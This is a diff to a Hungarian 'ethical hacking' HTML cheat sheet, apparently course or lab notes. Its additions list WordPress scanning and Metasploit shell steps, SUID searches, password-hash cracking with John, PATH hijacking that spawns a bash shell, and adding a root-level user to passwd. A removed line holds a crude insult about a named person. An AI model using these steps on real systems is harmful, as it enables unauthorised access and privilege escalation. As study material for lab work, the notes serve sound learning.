@@ -8,13 +8,30 @@
 </head>
 <body>
     <header>
-        <h1>EtikusH</h1>
+        <h1>Etikus Hackelés</h1>
         <hr>
     </header>
     <nav id="nav">
-        nav
-        <hr>
+        <ul>
+            <a href="#alapadat"><li>Alapadat</li></a>
+            <a href="#nmap"><li>Nmap</li></a>
+            <a href="#ssh"><li>SSH</li></a>
+            <a href="#dirb"><li>DirB</li></a>
+            <a href="#hydra"><li>Hydra</li></a>
+            <a href="#netcat"><li>Listener: Netcat</li></a>
+            <a href="#reverseshell"><li>ReverseShell</li></a>
+            <a href="#shellchain"><li>Shell Chaining</li></a>
+            <a href="#wpscan"><li>WPscan</li></a>
+            <a href="#wpplugin"><li>WPplugin</li></a>
+            <a href="#privesc"><li>Privelage Escalation</li></a>
+            <a href="#jelszohash"><li>Jelszóhash</li></a>
+            <a href="#highjack"><li>Highjacking</li></a>
+            <a href="#passwd"><li>Passwd Átírás</li></a>
+            <a href="#dnslookup"><li>DNS Lookup</li></a>
+            <a href="#images"><li>Images</li></a>
+        </ul>
     </nav>
+    <div><hr></div>
 
     <a href="#nav">
     <aside>
@@ -112,17 +129,99 @@
         <h2 id="wpscan">WPscan</h2>
 
         <p><kbd id="fo">wpscan --url &ltip&gt -e ap,at,u</kbd></p>
-        <p>Akos BUZI(szereti a faszt)</p>
+        <p>Authentication: <kbd>--http-auth &ltfelhasznalo:jelszo&gt</kbd></p>
+        <p>API token: <kbd>--api-token &lttoken&gt</kbd></p>
+        <p>Username, Password: <kbd>-U &ltusername&gt -P &ltpassword&gt</kbd></p>
+        <p>Login-uri <kbd>--login-uri wp-login.php</kbd></p>
 
         <hr>
 
 
 
 
+        <h2 id="wpplugin">WP plugin</h2>
+
+
+        <p>exploit-db.com</p>
+        <p><kbd id="fo">msfconsole</kbd></p>
+        <p><kbd>search Word Press shell</kbd></p>
+        <p>Opcionális: <kbd>info &ltszám&gt</kbd></p>
+        <p>Lehetoleg nem ssl: <kbd>use &ltszám&gt</kbd></p>
+        <p><kbd>options</kbd></p>
+        <p><kbd>set &ltváltozónév&gt &ltérték&gt</kbd></p>
+        <p><kbd>run</kbd></p>
+        <p><kbd>shell</kbd></p>
+        <p><kbd>exit</kbd></p> 
+
+        <hr>
 
 
 
+        <h2 id="privesc">Privelage escalation</h2>
 
+        <p>/etc/shadow /etc/passwd</p>
+
+        <p>Sudo jogok: <kbd>sudo -l</kbd></p>
+        <p>Home mappa megnézése</p>
+        <p>Suid bit misconfig: <kbd>suid -set uid</kbd></p>
+        <p>Suid bit misconfig: <kbd>suid -set gid</kbd></p>
+        <p>Megkeresni: <kbd>find / -perm -u=s 2>/dev/null</kbd></p>
+        <p>Ha ----------+ akkor: <kbd>getfacl &ltfilename&gt</kbd></p>
+        <p><kbd>-su jenő</kbd></p>
+        <p><kbd>-sudo -U jenő /usr/python/file.py</kbd></p>
+
+        <hr>
+
+
+
+        <h2 id="jelszohash">Jelszóhash feltörés</h2>
+
+        <p>Filekeszites: <kbd>echo "jenő:JELSZOHASH:1111:111:kummnent:homemappa:shellnev">john.txt</kbd></p>
+        <p><kbd>john john.txt --wordlist=/usr/share/wordslist/rockyou.txt --format=crypt</kbd></p>
+        
+        <hr>
+
+        <h2 id="highjack">Highjacking</h2>
+
+        <h3>Python library highjacking</h3>
+        <p>import xyz &lt----- abban a mapában keres ahol a file van</p>
+
+        <h3>Path highjacking</h3>
+
+        <p>Ha egy user használhat egy programot, sajátot készitunk és átirjuk a $PATH változót</p>
+        <p><kbd>touch &ltprogramnév&gt</kbd></p>
+        <p>Beleirjuk pl nanoval: <kbd>#!/bin/bash</kbd></p>
+        <p>Beleirjuk pl nanoval: <kbd>bash -i</kbd></p>
+        <p><kbd>chmaod 777 &ltprogramnév&gt</kbd></p>
+        <p><kbd>export PATH=&ltuj_elérési_utvonal&gt:$PATH</kbd></p>
+        <hr>
+
+        
+        
+        <h2 id="passwd">Passwd átírás</h2>
+
+        <h3>Jelszohash keszites: <kbd>openssl passwd -5</kbd></h3>
+        <p>uid=0, gid=0</p>
+        <p><kbd>echo 'jeno:HASH:0:0:comment:/home:/bin/bash'>>passwd</kbd></p>
+        <hr>
+
+        <h2 id="dnslookup">Belső Dns Lookup</h2>
+
+        <p>/etc/hosts</p>
+        <hr>
+
+        <h2 id="images">Images</h2>
+        
+        <img src="./Images/image1.jpg" alt="iamge">
+        <img src="./Images/image2.jpg" alt="iamge">
+        <img src="./Images/image3.jpg" alt="iamge">
+        <img src="./Images/image4.jpg" alt="iamge">
+        <img src="./Images/image5.jpg" alt="iamge">
+        <img src="./Images/image6.jpg" alt="iamge">
+        <img src="./Images/image7.jpg" alt="iamge">
+        <img src="./Images/image8.jpg" alt="iamge">
+        <img src="./Images/image9.jpg" alt="iamge">
+        <img src="./Images/image10.jpg" alt="iamge">
 
 
     </article>
